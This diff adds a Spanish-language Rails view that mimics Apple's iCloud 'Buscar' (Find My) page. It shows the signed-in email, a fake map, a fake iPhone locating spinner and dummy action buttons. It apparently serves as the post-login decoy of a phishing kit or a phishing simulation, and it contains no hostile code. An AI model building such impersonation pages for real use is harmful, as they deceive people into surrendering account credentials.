@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Buscar - iCloud</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; -webkit-font-smoothing:antialiased; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", Arial, sans-serif;
+      background: #1d1d1f;
+      min-height:100vh;
+      display:flex; flex-direction:column;
+    }
+
+    /* Top nav */
+    .navbar {
+      background: rgba(29,29,31,0.92);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid rgba(255,255,255,0.08);
+      padding: 0 20px;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky; top: 0; z-index: 100;
+    }
+    .nav-left { display:flex; align-items:center; gap:12px; }
+    .nav-icon { width:28px; height:28px; }
+    .nav-title { color:#f5f5f7; font-size:17px; font-weight:600; }
+    .nav-right { display:flex; align-items:center; gap:16px; }
+    .nav-email { color:#86868b; font-size:13px; max-width:150px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+    .btn-logout {
+      background: rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.12);
+      color: #f5f5f7;
+      border-radius: 8px;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-family: inherit;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-flex; align-items: center;
+      transition: background 0.2s;
+    }
+    .btn-logout:hover { background: rgba(255,255,255,0.15); }
+
+    /* Map area */
+    .map-container {
+      flex: 1;
+      position: relative;
+      background: #1a1a2e;
+      overflow: hidden;
+      min-height: 300px;
+    }
+    .map-bg {
+      width: 100%; height: 100%;
+      position: absolute; top:0; left:0;
+    }
+    /* Fake map grid */
+    .map-grid {
+      position: absolute; inset:0;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+    }
+    /* Fake roads */
+    .road-h1 { position:absolute; top:30%; left:0; right:0; height:2px; background:rgba(255,255,255,0.06); }
+    .road-h2 { position:absolute; top:60%; left:0; right:0; height:3px; background:rgba(255,255,255,0.08); }
+    .road-v1 { position:absolute; left:25%; top:0; bottom:0; width:2px; background:rgba(255,255,255,0.05); }
+    .road-v2 { position:absolute; left:65%; top:0; bottom:0; width:3px; background:rgba(255,255,255,0.08); }
+    .road-diag {
+      position:absolute; top:10%; left:40%;
+      width:3px; height:50%;
+      background:rgba(255,255,255,0.05);
+      transform: rotate(25deg);
+      transform-origin: top center;
+    }
+
+    /* Radar pulse animation */
+    .radar-center {
+      position: absolute;
+      top: 45%; left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    .pulse-ring {
+      position: absolute;
+      border-radius: 50%;
+      border: 2px solid rgba(0,122,255,0.6);
+      transform: translate(-50%, -50%);
+      animation: pulse 2s ease-out infinite;
+    }
+    .pulse-ring:nth-child(2) { animation-delay: 0.6s; }
+    .pulse-ring:nth-child(3) { animation-delay: 1.2s; }
+    @keyframes pulse {
+      0%   { width:0; height:0; opacity:0.9; top:50%; left:50%; }
+      100% { width:200px; height:200px; opacity:0; top:50%; left:50%; }
+    }
+    .pin {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -100%);
+      animation: bounce 1.5s ease-in-out infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translate(-50%, -100%); }
+      50%       { transform: translate(-50%, -115%); }
+    }
+
+    /* Info panel */
+    .info-panel {
+      background: #2c2c2e;
+      border-top: 1px solid rgba(255,255,255,0.1);
+      padding: 20px;
+    }
+    .panel-header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 16px;
+    }
+    .device-icon {
+      width: 48px; height: 48px;
+      background: rgba(255,255,255,0.08);
+      border-radius: 12px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .device-name { color:#f5f5f7; font-size:18px; font-weight:600; }
+    .device-status { color:#86868b; font-size:13px; margin-top:2px; }
+
+    .status-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 12px;
+    }
+    .spinner {
+      width: 18px; height: 18px;
+      border: 2px solid rgba(255,255,255,0.15);
+      border-top-color: #0071e3;
+      border-radius: 50%;
+      flex-shrink: 0;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .status-text { color:#f5f5f7; font-size:15px; }
+    .status-sub  { color:#86868b; font-size:13px; margin-top:2px; }
+
+    .actions {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 16px;
+    }
+    .action-btn {
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 14px 10px;
+      text-align: center;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .action-btn:hover { background: rgba(255,255,255,0.1); }
+    .action-btn-icon { font-size: 22px; margin-bottom: 4px; }
+    .action-btn-label { color: #f5f5f7; font-size: 13px; font-weight: 500; }
+    .action-btn.danger { border-color: rgba(255,69,58,0.3); }
+    .action-btn.danger .action-btn-label { color: #ff453a; }
+
+    /* Sidebar on desktop */
+    @media (min-width: 768px) {
+      .main-layout { display: flex; flex: 1; }
+      .map-container { flex: 1; min-height: 0; }
+      .info-panel {
+        width: 340px; flex-shrink: 0;
+        border-top: none;
+        border-left: 1px solid rgba(255,255,255,0.1);
+        overflow-y: auto;
+      }
+      .actions { grid-template-columns: 1fr 1fr; }
+    }
+    @media (max-width: 400px) {
+      .nav-email { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+  <nav class="navbar">
+    <div class="nav-left">
+      <svg class="nav-icon" viewBox="0 0 28 28" fill="none">
+        <rect width="28" height="28" rx="7" fill="#34C759"/>
+        <path d="M14 6C10.134 6 7 9.134 7 13C7 18.25 14 23 14 23C14 23 21 18.25 21 13C21 9.134 17.866 6 14 6Z" fill="white" fill-opacity="0.95"/>
+        <circle cx="14" cy="13" r="2.5" fill="#34C759"/>
+      </svg>
+      <span class="nav-title">Buscar</span>
+    </div>
+    <div class="nav-right">
+      <span class="nav-email"><%= @email %></span>
+      <%= button_to "Cerrar sesion", logout_path, method: :delete, class: "btn-logout" %>
+    </div>
+  </nav>
+
+  <div class="main-layout" style="display:flex; flex:1; flex-direction:column;">
+
+    <% if request.mobile? rescue true %>
+    <% end %>
+
+    <div style="display:flex; flex:1; flex-direction:column;" id="layout">
+
+      <!-- Fake map -->
+      <div class="map-container" style="flex:1; min-height:280px;">
+        <div class="map-grid"></div>
+        <div class="road-h1"></div>
+        <div class="road-h2"></div>
+        <div class="road-v1"></div>
+        <div class="road-v2"></div>
+        <div class="road-diag"></div>
+
+        <div class="radar-center">
+          <div class="pulse-ring"></div>
+          <div class="pulse-ring"></div>
+          <div class="pulse-ring"></div>
+
+          <!-- Pin -->
+          <div class="pin">
+            <svg width="36" height="48" viewBox="0 0 36 48" fill="none">
+              <path d="M18 0C8.059 0 0 8.059 0 18C0 30 18 48 18 48C18 48 36 30 36 18C36 8.059 27.941 0 18 0Z" fill="#0071e3"/>
+              <circle cx="18" cy="18" r="7" fill="white"/>
+            </svg>
+          </div>
+        </div>
+
+        <!-- Map label -->
+        <div style="position:absolute; bottom:12px; right:12px; background:rgba(0,0,0,0.5); border-radius:8px; padding:4px 10px;">
+          <span style="color:#86868b; font-size:11px;">Mapa simulado</span>
+        </div>
+      </div>
+
+      <!-- Info panel -->
+      <div class="info-panel">
+        <div class="panel-header">
+          <div class="device-icon">
+            <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+              <rect x="6" y="2" width="16" height="24" rx="3" stroke="#86868b" stroke-width="1.5"/>
+              <circle cx="14" cy="22" r="1.5" fill="#86868b"/>
+              <rect x="10" y="5" width="8" height="1" rx="0.5" fill="#86868b"/>
+            </svg>
+          </div>
+          <div>
+            <div class="device-name">iPhone de <%= @email&.split('@')&.first&.capitalize || 'Usuario' %></div>
+            <div class="device-status">iPhone 15 Pro &bull; iOS 17.4</div>
+          </div>
+        </div>
+
+        <div class="status-row">
+          <div class="spinner"></div>
+          <div>
+            <div class="status-text">Buscando ubicacion...</div>
+            <div class="status-sub">Conectando con el dispositivo</div>
+          </div>
+        </div>
+
+        <div style="color:#86868b; font-size:12px; text-align:center; margin-bottom:14px;">
+          Esto puede tardar unos momentos
+        </div>
+
+        <div style="background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.08); border-radius:12px; padding:14px; margin-bottom:4px;">
+          <div style="color:#86868b; font-size:12px; margin-bottom:8px; text-transform:uppercase; letter-spacing:0.5px;">Estado del dispositivo</div>
+          <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
+            <span style="color:#86868b; font-size:13px;">Bateria</span>
+            <span style="color:#34C759; font-size:13px;">&#9646;&#9646;&#9646; 72%</span>
+          </div>
+          <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
+            <span style="color:#86868b; font-size:13px;">Red</span>
+            <span style="color:#f5f5f7; font-size:13px;">LTE</span>
+          </div>
+          <div style="display:flex; justify-content:space-between;">
+            <span style="color:#86868b; font-size:13px;">Ultima vez visto</span>
+            <span style="color:#f5f5f7; font-size:13px;">Hace 2 min</span>
+          </div>
+        </div>
+
+        <div class="actions">
+          <div class="action-btn">
+            <div class="action-btn-icon">&#128266;</div>
+            <div class="action-btn-label">Reproducir sonido</div>
+          </div>
+          <div class="action-btn">
+            <div class="action-btn-icon">&#128274;</div>
+            <div class="action-btn-label">Modo perdido</div>
+          </div>
+          <div class="action-btn" style="grid-column:span 2;">
+            <div class="action-btn-icon">&#128262;</div>
+            <div class="action-btn-label">Obtener indicaciones</div>
+          </div>
+          <div class="action-btn danger" style="grid-column:span 2;">
+            <div class="action-btn-icon">&#x1F5D1;</div>
+            <div class="action-btn-label">Borrar este iPhone</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    // On desktop: side-by-side layout
+    function applyLayout() {
+      var layout = document.getElementById('layout');
+      if (window.innerWidth >= 768) {
+        layout.style.flexDirection = 'row';
+      } else {
+        layout.style.flexDirection = 'column';
+      }
+    }
+    applyLayout();
+    window.addEventListener('resize', applyLayout);
+  </script>
+
+</body>
+</html>
